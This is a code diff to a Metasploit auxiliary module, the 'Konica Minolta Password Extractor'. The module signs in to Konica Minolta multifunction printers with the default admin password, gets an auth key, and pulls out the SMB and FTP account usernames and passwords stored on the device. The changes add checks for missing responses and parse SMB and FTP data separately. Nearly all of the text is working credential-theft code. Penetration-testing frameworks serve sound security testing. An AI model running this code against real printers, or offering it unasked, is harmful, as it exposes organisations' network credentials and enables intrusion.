@@ -14,10 +14,10 @@ class Metasploit3 < Msf::Auxiliary
   def initialize(info = {})
     super(update_info(info,
       'Name'        => 'Konica Minolta Password Extractor',
-      'Description' => %{
+      'Description' => %q(
         This module will extract FTP and SMB account usernames and passwords
         from Konica Minolta mfp devices. Tested models include: C224, C280,
-        283, C353, C360, 363, 420, C452,C452, C452, C454e },
+        283, C353, C360, 363, 420, C452,C452, C452, C454e ),
       'Author'      =>
         [
           'Deral "Percentx" Heiland',
@@ -28,8 +28,7 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptBool.new('SSL', [true, 'Negotiate SSL for outgoing connections', false]),
-        OptPort.new('RPORT', [true, 'The target port', '50001']),
+        Opt::RPORT('50001'),
         OptString.new('USER', [false, 'The default Admin user', 'Admin']),
         OptString.new('PASSWD', [true, 'The default Admin password', '12345678']),
         OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])
@@ -118,15 +117,20 @@ class Metasploit3 < Msf::Auxiliary
       'method' => 'POST',
       'data'   => '<SOAP-ENV:Envelope></SOAP-ENV:Envelope>'
     }, datastore['TIMEOUT'].to_i)
-    xml0_body = ::Nokogiri::XML(response.body)
-    major_parse = xml0_body.xpath('//Major').text
-    minor_parse = xml0_body.xpath('//Minor').text
-    major = ("#{major_parse}")
-    minor = ("#{minor_parse}")
-    login(major, minor)
+    if response.nil?
+      print_error("#{peer} - No reponse from device")
+      return
+    else
+      xml0_body = ::Nokogiri::XML(response.body)
+      major_parse = xml0_body.xpath('//Major').text
+      minor_parse = xml0_body.xpath('//Minor').text
+      major = ("#{major_parse}")
+      minor = ("#{minor_parse}")
+      login(major, minor)
+    end
 
-  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
-    print_error("#{peer} - Version check Connection failed.")
+    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
+      print_error("#{peer} - Version check Connection failed.")
   end
 
   # This section logs on and retrieves AuthKey token
@@ -141,10 +145,15 @@ class Metasploit3 < Msf::Auxiliary
         'method' => 'POST',
         'data'   => "#{authreq_xml}"
       }, datastore['TIMEOUT'].to_i)
-      xml1_body = ::Nokogiri::XML(response.body)
-      authkey_parse = xml1_body.xpath('//AuthKey').text
-      authkey = ("#{authkey_parse}")
-      extract(major, minor, authkey)
+      if response.nil?
+        print_error("#{peer} - No reponse from device")
+        return
+      else
+        xml1_body = ::Nokogiri::XML(response.body)
+        authkey_parse = xml1_body.xpath('//AuthKey').text
+        authkey = ("#{authkey_parse}")
+        extract(major, minor, authkey)
+      end
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
       print_error("#{peer} - Login Connection failed.")
     end
@@ -164,34 +173,42 @@ class Metasploit3 < Msf::Auxiliary
           'method' => 'POST',
           'data'   => "#{smbreq_xml}"
         }, datastore['TIMEOUT'].to_i)
-        xml2_body = ::Nokogiri::XML(response.body)
-        @user_data = xml2_body.xpath('//User').map { |val| val.text }
-        @pass_data = xml2_body.xpath('//Password').map { |val1| val1.text }
-        @fold_data = xml2_body.xpath('//Folder').map { |val2| val2.text }
-        @ftp_host = xml2_body.xpath('//Address').map { |val3| val3.text }
-        @smb_host = xml2_body.xpath('//Host').map { |val4| val4.text }
+        if response.nil?
+          print_error("#{peer} - No reponse from device")
+          return
+        else
+          xml2_body = ::Nokogiri::XML(response.body)
+          @smb_user = xml2_body.xpath('//SmbMode/User').map { |val1| val1.text }
+          @smb_pass = xml2_body.xpath('//SmbMode/Password').map { |val2| val2.text }
+          @smb_host = xml2_body.xpath('//SmbMode/Host').map { |val3| val3.text }
+          @ftp_user = xml2_body.xpath('//FtpServerMode/User').map { |val4| val4.text }
+          @ftp_pass = xml2_body.xpath('//FtpServerMode/Password').map { |val5| val5.text }
+          @ftp_host = xml2_body.xpath('//FtpServerMode/Address').map { |val6| val6.text }
+          @ftp_port = xml2_body.xpath('//FtpServerMode/PortNo').map { |val6| val6.text }
+        end
       end
       i = 0
-      # check for empty fields, identify protocol type, pass to creds database
-      @user_data.each do
-        fhost = "#{@ftp_host[i]}"
+      # output SMB data
+      @smb_user.each do
         shost = "#{@smb_host[i]}"
-        uname = "#{@user_data[i]}"
-        pword = "#{@pass_data[i]}"
-
-        if !shost.empty? && !uname.empty?
-          port = '139'
-          host = "#{@smb_host[i]}"
-          print_good("User=#{uname}:Password=#{pword}:Host=#{host}:Port=#{port}")
-          register_creds('smb', host, port, uname, pword)
-        elsif !fhost.empty? && !uname.empty?
-          port = '21'
-          host = "#{@ftp_host[i]}"
-          print_good("User=#{uname} Password=#{pword} Host=#{host} Port=#{port}")
-          register_creds('ftp', host, port, uname, pword)
-        end
+        sname = "#{@smb_user[i]}"
+        sword = "#{@smb_pass[i]}"
+        print_good("SMB Account:User=#{sname}:Password=#{sword}:Host=#{shost}:Port=139")
+        register_creds('smb', shost, '139', sname, sword)
         i += 1
       end
+      i = 0
+      # output FTP data
+      @ftp_user.each do
+        fhost = "#{@ftp_host[i]}"
+        fname = "#{@ftp_user[i]}"
+        fword = "#{@ftp_pass[i]}"
+        fport = "#{@ftp_port[i]}"
+        print_good("FTP Account:User=#{fname}:Password=#{fword}:Host=#{fhost}:Port=#{fport}")
+        register_creds('ftp', fhost, fport, fname, fword)
+        i += 1
+      end
+
     else
       print_status('No AuthKey returned possible causes Authentication failed or unsupported Konica model')
       return
